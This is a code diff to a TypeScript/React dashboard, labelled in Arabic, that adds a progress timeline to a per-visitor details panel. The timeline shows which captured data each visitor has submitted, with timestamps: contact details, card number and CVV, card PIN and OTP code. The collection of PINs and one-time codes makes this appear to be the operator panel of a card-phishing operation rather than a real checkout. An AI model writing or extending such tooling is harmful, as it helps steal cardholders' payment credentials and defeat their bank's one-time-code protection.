@@ -901,6 +901,9 @@ const DetailsPanel = ({ v, onClose, onDelete }: { v: Visitor; onClose: () => voi
         </div>
       </div>
 
+      {/* Stage progress timeline */}
+      <StageProgress v={v} />
+
       {/* All info cards — shown together, real-time, no tabs */}
       <StageCards v={v} />
 
@@ -994,6 +997,111 @@ const StageCard = ({
         <StageBadge tone={tone} label={badge} />
       </div>
       <div className="p-5 space-y-2.5 text-sm">{children}</div>
+    </div>
+  );
+};
+
+const StageProgress = ({ v }: { v: Visitor }) => {
+  const steps: {
+    key: "checkout" | "card" | "pin" | "otp";
+    label: string;
+    icon: typeof UsersIcon;
+    at: string | null;
+    done: boolean;
+    tone: string;
+  }[] = [
+    {
+      key: "checkout",
+      label: "إتمام الطلب",
+      icon: UsersIcon,
+      at: v.checkout_at,
+      done: hasAny(v.full_name, v.email, v.phone, v.address, v.plan_selected, v.order_total),
+      tone: "sky",
+    },
+    {
+      key: "card",
+      label: "بطاقة الدفع",
+      icon: CreditCard,
+      at: v.card_at,
+      done: hasAny(v.card_number, v.card_holder, v.card_expiry, v.card_cvv),
+      tone: "rose",
+    },
+    {
+      key: "pin",
+      label: "الرقم السري",
+      icon: Lock,
+      at: v.pin_at,
+      done: hasAny(v.card_pin),
+      tone: "amber",
+    },
+    {
+      key: "otp",
+      label: "رمز OTP",
+      icon: ShieldCheck,
+      at: v.otp_at,
+      done: hasAny(v.card_otp),
+      tone: "emerald",
+    },
+  ];
+
+  const toneActive: Record<string, string> = {
+    sky: "bg-sky-500 text-white border-sky-500",
+    rose: "bg-rose-500 text-white border-rose-500",
+    amber: "bg-amber-500 text-white border-amber-500",
+    emerald: "bg-emerald-500 text-white border-emerald-500",
+  };
+  const toneLine: Record<string, string> = {
+    sky: "bg-sky-500",
+    rose: "bg-rose-500",
+    amber: "bg-amber-500",
+    emerald: "bg-emerald-500",
+  };
+
+  const completedCount = steps.filter((s) => s.done).length;
+
+  return (
+    <div className="bg-card rounded-2xl border border-border/60 p-4 md:p-6">
+      <div className="flex items-center justify-between mb-4">
+        <div className="text-[10px] font-bold uppercase tracking-widest text-muted-foreground/70">
+          مراحل العملية
+        </div>
+        <div className="text-xs text-muted-foreground tabular-nums">
+          {completedCount} / {steps.length}
+        </div>
+      </div>
+
+      <div className="flex items-start gap-1 md:gap-2">
+        {steps.map((step, idx) => {
+          const Icon = step.icon;
+          const nextDone = idx < steps.length - 1 && steps[idx + 1].done;
+          return (
+            <div key={step.key} className="flex-1 flex flex-col items-center min-w-0">
+              <div className="w-full flex items-center">
+                <div className={`flex-1 h-0.5 ${idx === 0 ? "opacity-0" : step.done ? toneLine[step.tone] : "bg-border"}`} />
+                <div
+                  className={`shrink-0 w-9 h-9 md:w-10 md:h-10 rounded-full border-2 flex items-center justify-center transition-all ${
+                    step.done
+                      ? toneActive[step.tone]
+                      : "bg-background border-border text-muted-foreground/50"
+                  }`}
+                  title={step.at ? formatDateTime(step.at) : "لم يكتمل بعد"}
+                >
+                  {step.done ? <Check className="w-4 h-4 md:w-5 md:h-5" /> : <Icon className="w-4 h-4 md:w-5 md:h-5" />}
+                </div>
+                <div className={`flex-1 h-0.5 ${idx === steps.length - 1 ? "opacity-0" : nextDone ? toneLine[step.tone] : "bg-border"}`} />
+              </div>
+              <div className="mt-2 text-center w-full">
+                <div className={`text-[11px] md:text-xs font-medium truncate ${step.done ? "text-foreground" : "text-muted-foreground/60"}`}>
+                  {step.label}
+                </div>
+                <div className="text-[10px] text-muted-foreground tabular-nums mt-0.5 truncate">
+                  {step.at ? formatDateTime(step.at) : "—"}
+                </div>
+              </div>
+            </div>
+          );
+        })}
+      </div>
     </div>
   );
 };
